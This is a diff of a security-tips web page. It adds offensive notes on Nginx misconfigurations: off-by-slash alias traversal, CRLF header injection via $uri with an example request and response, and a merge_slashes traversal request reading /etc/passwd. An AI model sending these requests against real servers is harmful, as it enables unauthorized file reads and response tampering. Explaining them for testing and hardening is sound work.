@@ -7,8 +7,8 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link rel="search" href="/opensearch.xml" type="application/opensearchdescription+xml" title="Security Tips">
 
-  
-  
+  <meta name="description" content="Tips to exfiltrate information from a MSSQL database.">
+  <meta name="keywords" content="nginx, web">
 
   <meta name="author" content="Vincent D. (@vincd)">
   <link rel="shortcut icon" href="../img/favicon.ico">
@@ -144,11 +144,15 @@
     
     <ul>
     
-        <li><a class="" href="#configuration-file">Configuration file</a></li>
+        <li><a class="" href="#missing-slash-off-by-slash">Missing slash (Off-By-Slash)</a></li>
     
-        <li><a class="" href="#rce-in-php-fpm-cve-2019-11043">RCE in php-fpm (CVE-2019-11043)</a></li>
+        <li><a class="" href="#uri-normalization-leads-to-crlf-injection">$uri normalization leads to CRLF injection</a></li>
+    
+        <li><a class="" href="#merge_slashes-set-to-off">merge_slashes set to off</a></li>
     
     </ul>
+    
+
     
 
     </ul>
@@ -384,9 +388,11 @@
         <div role="main">
           <div class="section">
             
-              <h1></h1>
-              <h1 id="nginx">Nginx</h1>
-<h2 id="configuration-file">Configuration file</h2>
+              <h1>Nginx</h1>
+              <h2 id="misconfiguration">Misconfiguration</h2>
+<p>Configuration file may include vulnerabilities allowing an attacker to access files
+out of the root folder or injecting headers.</p>
+<h3 id="missing-slash-off-by-slash">Missing slash (Off-By-Slash)</h3>
 <p>Here is a miss-configuration in the the <code>nginx.conf</code> file:</p>
 <div class="clipboard-content">  <pre><code class="language-nginx"># static files
 location /static {
@@ -398,6 +404,54 @@ location /static {
 }
 ">    Copy  </button></div></div>
 <p>The location value does not end with a <code>/</code> but the alias value does. Which means that if we query: <code>https://example.com/static../foo</code> then the location will match and will concatenate <code>../foo</code> to the alias, which gives us this local file access: <code>/srv/app/static/../foo</code></p>
+<h3 id="uri-normalization-leads-to-crlf-injection"><code>$uri</code> normalization leads to CRLF injection</h3>
+<p>The variable <code>$uri</code> (and <code>$document_uri</code>) is normaized, that mean URLencoded chars
+will be decoded. If this variable is used in a redirection or in <code>rewrite</code> then
+it's possible to inject characters in <code>Location</code> header:</p>
+<div class="clipboard-content">  <pre><code class="language-j2">location / {
+    return 302 https://$host$uri;
+}
+location / {
+    rewrite ^ https://$host/$uri;
+}
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="location / {
+    return 302 https://$host$uri;
+}
+location / {
+    rewrite ^ https://$host/$uri;
+}
+">    Copy  </button></div></div>
+<p>Here is an example with the following request:</p>
+<div class="clipboard-content">  <pre><code class="language-http">GET /notexist%0d%0aX-Vincd:%20New-Header-Value HTTP/1.0
+Host: vincd.com
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="GET /notexist%0d%0aX-Vincd:%20New-Header-Value HTTP/1.0
+Host: vincd.com
+">    Copy  </button></div></div>
+<p>The response will be something like:</p>
+<div class="clipboard-content">  <pre><code class="language-http">HTTP/1.1 302 Moved Temporarily
+Server: nginx
+...
+Location: https://vincd.com/notexist
+X-Vincd: New-Header-Value
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="HTTP/1.1 302 Moved Temporarily
+Server: nginx
+...
+Location: https://vincd.com/notexist
+X-Vincd: New-Header-Value
+">    Copy  </button></div></div>
+<h3 id="merge_slashes-set-to-off"><code>merge_slashes</code> set to off</h3>
+<p>The <a href="http://nginx.org/en/docs/http/ngx_http_core_module.html#merge_slashes" target="_blank"><code>merge_slashes</code></a>
+directive is a mecanisme to to merge two consecutive slashes. By default this
+confguration is set to <code>on</code>.</p>
+<p>If the configuration is set to <code>off</code> and the reversed-proxy application is 
+vulnerable to <code>Local-File-Inclusion</code> then it's possible to exploit it.
+<a href="https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d" target="_blank">This article</a>
+from <code>Danny Robinson</code> and <code>Roten Bar</code> detailed this exploitation.</p>
+<div class="clipboard-content">  <pre><code class="language-http">GET /////../../../../../etc/passwd HTTP/1.1
+Host: vincd.com
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="GET /////../../../../../etc/passwd HTTP/1.1
+Host: vincd.com
+">    Copy  </button></div></div>
 <h2 id="rce-in-php-fpm-cve-2019-11043">RCE in php-fpm (CVE-2019-11043)</h2>
 <p>If a webserver runs nginx + php-fpm and nginx have a configuration like</p>
 <div class="clipboard-content">  <pre><code class="language-nginx">location ~ [^/]\.php(/|$) {
